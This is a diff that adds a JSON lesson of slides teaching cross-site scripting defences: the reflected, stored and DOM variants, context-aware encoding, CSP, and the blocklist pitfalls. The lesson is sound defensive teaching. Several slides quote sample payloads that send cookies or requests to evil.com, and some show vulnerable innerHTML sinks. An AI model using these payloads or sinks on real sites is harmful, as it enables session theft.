@@ -1,0 +1,174 @@
+{
+  "id": "xss",
+  "title": "Cross-Site Scripting (XSS)",
+  "area": "security",
+  "group": "appsec",
+  "order": 4,
+  "slug": "xss",
+  "summary": "XSS is injection's browser-side sibling: untrusted data executed as script in someone else's session. Covers the three variants, why context-aware output encoding is the real fix, and how CSP adds a second line of defense.",
+  "level": "intermediate",
+  "slideCount": 11,
+  "estReadMinutes": 11,
+  "slides": [
+    {
+      "id": "xss-s01",
+      "order": 1,
+      "sectionTitle": "Snapshot",
+      "subTitle": null,
+      "type": "overview",
+      "markdown": "If [injection](injection-attacks) is untrusted data executed as a database or shell command, **XSS is the same idea one layer up**: untrusted data executed as script in someone else's browser, inside their already-authenticated session.\n\nThat session detail is what makes XSS dangerous beyond defacement — a script running as the victim can read their cookies, make requests with their authority, and exfiltrate whatever the page can see, all without the victim noticing anything happened.\n\nThis topic covers the three variants — reflected, stored, DOM-based — where the payload lives in each, and the two real defenses: encoding output for the context it lands in, and Content Security Policy as a second line of defense when encoding alone isn't enough. Browser-specific mechanics (the DOM APIs, sinks, sanitizer libraries) live in Web & Frontend; this is the server-side and conceptual half.",
+      "assets": [],
+      "hasCode": false,
+      "hasTable": false,
+      "estReadSeconds": 62,
+      "mcqIds": []
+    },
+    {
+      "id": "xss-s02",
+      "order": 2,
+      "sectionTitle": "What XSS is",
+      "subTitle": null,
+      "type": "concept",
+      "markdown": "XSS happens when an application takes untrusted input and puts it into a page in a way that lets it execute as **script**, rather than display as inert text.\n\nA comment box that stores `<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>` and renders it back verbatim doesn't just display the string — the browser parses it as HTML, sees a `<script>` tag, and runs it, with the full privileges of whoever's viewing the page: their cookies, their session, their ability to click things on their behalf.\n\nThe root cause is structurally identical to server-side injection: untrusted data and executable content share one channel — HTML — with no separation between them. The fix, as with injection, is to keep them separate: encode untrusted data so the browser can only ever interpret it as inert text, never as markup or script.",
+      "assets": [],
+      "hasCode": false,
+      "hasTable": false,
+      "estReadSeconds": 68,
+      "mcqIds": [
+        "xss-s02-q1"
+      ]
+    },
+    {
+      "id": "xss-s03",
+      "order": 3,
+      "sectionTitle": "Reflected XSS",
+      "subTitle": null,
+      "type": "concept",
+      "markdown": "**Reflected** XSS is the simplest variant: the payload travels in the request itself — typically a URL parameter — and the server echoes it straight back into the response without encoding.\n\nA search page that renders `<p>No results for: {query}</p>` directly from the URL's `?query=` parameter is vulnerable if `query` is `<script>...</script>`: the victim has to click a *crafted link* (often in a phishing email) for the payload to run, since the attacker needs the victim's own browser to send the malicious parameter.\n\nBecause it requires a click, reflected XSS is delivered via social engineering — a shortened URL, an email, a message in a support ticket — rather than sitting persistently on the site. It doesn't survive past that one request: refresh without the malicious parameter and the page is clean again.",
+      "assets": [],
+      "hasCode": false,
+      "hasTable": false,
+      "estReadSeconds": 70,
+      "mcqIds": []
+    },
+    {
+      "id": "xss-s04",
+      "order": 4,
+      "sectionTitle": "Stored XSS",
+      "subTitle": null,
+      "type": "concept",
+      "markdown": "**Stored** XSS is reflected XSS's more dangerous sibling: the payload is saved server-side — in a comment, a profile bio, a support ticket — and served to *every* subsequent visitor who views that content, with no crafted link required.\n\nA comment field that stores a malicious `<script>` tag and renders it for every visitor to that page turns one successful post into an attack against everyone who reads the comments, including moderators and admins with elevated privileges — which is exactly why attackers target admin-facing surfaces (support tickets, review queues) specifically.\n\nThe severity difference from reflected XSS comes down to reach and persistence: no phishing click needed, no expiry, and the blast radius is every viewer rather than one victim who clicked a link.",
+      "assets": [],
+      "hasCode": false,
+      "hasTable": false,
+      "estReadSeconds": 66,
+      "mcqIds": [
+        "xss-s04-q1"
+      ]
+    },
+    {
+      "id": "xss-s05",
+      "order": 5,
+      "sectionTitle": "DOM-based XSS",
+      "subTitle": null,
+      "type": "concept",
+      "markdown": "**DOM-based** XSS is the variant where the vulnerability lives entirely in client-side JavaScript — the server may never even see the malicious payload.\n\nA page that reads part of the URL and writes it directly into the DOM client-side — `document.getElementById('welcome').innerHTML = location.hash.substring(1)` — executes whatever script an attacker puts after the `#` in the URL, purely in the browser. The server's response never contained the payload at all; the URL fragment (`#...`) isn't even sent to the server by default.\n\nThis matters for where you look for the bug: reflected and stored XSS show up in server logs and server-rendered output, so a server-side code review can catch them. DOM-based XSS requires reviewing client-side JavaScript specifically — any place a page writes attacker-influenceable data (URL, `postMessage`, `localStorage`) into a **sink** like `innerHTML` without sanitizing it first.",
+      "assets": [],
+      "hasCode": false,
+      "hasTable": false,
+      "estReadSeconds": 72,
+      "mcqIds": [
+        "xss-s05-q1"
+      ]
+    },
+    {
+      "id": "xss-s06",
+      "order": 6,
+      "sectionTitle": "Output encoding by context",
+      "subTitle": null,
+      "type": "concept",
+      "markdown": "The real fix for XSS is **context-aware output encoding**: encode untrusted data differently depending on *where* in the page it lands, because each context has a different set of characters that can break out into executable territory.\n\n- **HTML body** (`<p>{data}</p>`) — encode `<`, `>`, `&`, `\"`, `'` to their HTML entities so a `<script>` tag renders as visible text, not a parsed element.\n- **HTML attribute** (`<div title=\"{data}\">`) — encoding just the HTML-special characters isn't enough; a `\"` still lets an attacker close the attribute and add a new one like `onmouseover=...`, so attribute-context encoding must cover quotes rigorously.\n- **JavaScript context** (`<script>var x = \"{data}\";</script>`) — HTML encoding doesn't help here at all; you need JavaScript-string encoding, and inserting untrusted data into a `<script>` block is risky enough that it's usually avoided entirely in favor of passing data via a data attribute the script reads.\n- **URL context** (`<a href=\"{data}\">`) — needs URL encoding, and must also reject the `javascript:` scheme outright, since URL-encoding alone doesn't stop a `javascript:alert(1)` href from executing.\n\nUsing the wrong encoding for the context — HTML-encoding data destined for a `<script>` block, say — is a common false sense of safety: the encoding runs, but it doesn't neutralize the actual escape path for that context.",
+      "assets": [],
+      "hasCode": false,
+      "hasTable": false,
+      "estReadSeconds": 82,
+      "mcqIds": [
+        "xss-s06-q1"
+      ]
+    },
+    {
+      "id": "xss-s07",
+      "order": 7,
+      "sectionTitle": "Content Security Policy: defense in depth",
+      "subTitle": null,
+      "type": "concept",
+      "markdown": "Content Security Policy (CSP) is a response header that tells the browser which sources of script, style, and other resources are allowed to execute on the page — a second layer that limits damage **even if encoding fails somewhere**.\n\nA policy like `Content-Security-Policy: script-src 'self'` tells the browser to run only scripts loaded from the page's own origin, rejecting inline `<script>` tags and scripts from any other domain. An attacker who does manage to inject `<script>fetch('https://evil.com/...')</script>` finds the browser simply refuses to execute it, because it isn't from an allowed source and isn't a permitted inline script.\n\nCSP is explicitly **defense in depth, not the primary fix** — it's a browser-enforced backstop, and it can be misconfigured (an overly permissive `script-src 'unsafe-inline'` defeats most of its value) or bypassed via a whitelisted-but-exploitable third-party script. Output encoding remains the primary control; CSP is what limits blast radius when encoding has a gap somewhere you didn't catch.",
+      "assets": [],
+      "hasCode": false,
+      "hasTable": false,
+      "estReadSeconds": 76,
+      "mcqIds": [
+        "xss-s07-q1"
+      ]
+    },
+    {
+      "id": "xss-s08",
+      "order": 8,
+      "sectionTitle": "A template that escapes vs one that doesn't",
+      "subTitle": null,
+      "type": "code",
+      "markdown": "The difference between vulnerable and safe rendering is usually one function call, not a rewrite:\n\n```javascript\n// Vulnerable: raw insertion, browser parses it as HTML\nelement.innerHTML = userComment;\n\n// Safe: treated as text content, never parsed as markup\nelement.textContent = userComment;\n\n// Vulnerable: template literal concatenated straight into HTML\nconst html = `<p>${userComment}</p>`;\ncontainer.innerHTML = html;\n\n// Safe: modern templating engines auto-escape by default\n// (React JSX, Vue templates, Django/Jinja2 {{ }} all HTML-encode automatically)\nfunction Comment({ text }) { return <p>{text}</p>; } // React encodes `text` automatically\n```\n\nMost XSS in modern codebases comes from *opting out* of a framework's default escaping — `dangerouslySetInnerHTML` in React, `v-html` in Vue, the `|safe` filter in Jinja2 — usually to render user-authored rich text (a blog post with bold and links). Those escape hatches need a dedicated HTML sanitizer library, not manual encoding and not blind trust.",
+      "assets": [],
+      "hasCode": true,
+      "hasTable": false,
+      "estReadSeconds": 74,
+      "mcqIds": []
+    },
+    {
+      "id": "xss-s09",
+      "order": 9,
+      "sectionTitle": "A stored-XSS attack chain",
+      "subTitle": null,
+      "type": "diagram",
+      "markdown": "![Three-step stored XSS attack chain: attacker posts a script, it persists in the database, and a victim's browser executes it with their own session](assets/stored-xss-attack-chain.svg)\n\nThe diagram's key point: the attacker never touches the victim directly. The vulnerable render step at step 3 is the only place a fix is needed — encode the comment at output time and the exact same stored payload becomes inert, displayed as literal text instead of executed as script.",
+      "assets": [
+        {
+          "alt": "Three-step stored XSS attack chain: attacker posts a script, it persists in the database, and a victim's browser executes it with their own session",
+          "path": "assets/stored-xss-attack-chain.svg"
+        }
+      ],
+      "hasCode": false,
+      "hasTable": false,
+      "estReadSeconds": 60,
+      "mcqIds": []
+    },
+    {
+      "id": "xss-s10",
+      "order": 10,
+      "sectionTitle": "Stored vs reflected vs DOM-based: where the payload lives",
+      "subTitle": null,
+      "type": "compare",
+      "markdown": "| | Reflected | Stored | DOM-based |\n|---|---|---|---|\n| **Payload travels via** | The request (URL/form) | The server's datastore | Never leaves the browser |\n| **Server sees the payload** | Yes | Yes, persistently | Not necessarily |\n| **Requires a victim to click a link** | Yes | No | Depends (often yes, via URL fragment) |\n| **Persists across visits** | No | Yes, until removed | No |\n| **Where the fix lives** | Server-side output encoding | Server-side output encoding | Client-side JavaScript sink review |\n\nInterviewers use this table to check whether you actually distinguish the variants rather than saying \"XSS\" as one undifferentiated thing — the fix location differs enough that a server-side security review alone will miss DOM-based XSS entirely.",
+      "assets": [],
+      "hasCode": false,
+      "hasTable": true,
+      "estReadSeconds": 64,
+      "mcqIds": []
+    },
+    {
+      "id": "xss-s11",
+      "order": 11,
+      "sectionTitle": "Relying on a blocklist of \"dangerous\" characters",
+      "subTitle": null,
+      "type": "pitfall",
+      "markdown": "The XSS equivalent of hand-rolled SQL sanitization: stripping or blocking a fixed list of \"dangerous\" substrings like `<script>` before rendering.\n\nWhy it fails predictably:\n\n- **Case and encoding variations** — `<ScRiPt>`, `<script >` with a trailing space, or HTML entity-encoded angle brackets all bypass a naive literal match.\n- **Non-`<script>` execution vectors** — `<img src=x onerror=\"fetch('evil.com')\">` never contains the word \"script\" at all; neither does `<svg onload=...>` or a crafted `javascript:` URL in an `href`.\n- **Context blindness** — a blocklist checked once at input time can't account for where the data eventually renders; something safe for an HTML body can still break out of a JavaScript context.\n\nThe fix is the same lesson as injection: don't enumerate bad patterns, structurally prevent code and data from merging — via context-aware encoding at output time, applied every time data reaches the page, not a filter applied once at input time and trusted forever after.",
+      "assets": [],
+      "hasCode": false,
+      "hasTable": false,
+      "estReadSeconds": 72,
+      "mcqIds": [
+        "xss-s11-q1"
+      ]
+    }
+  ]
+}
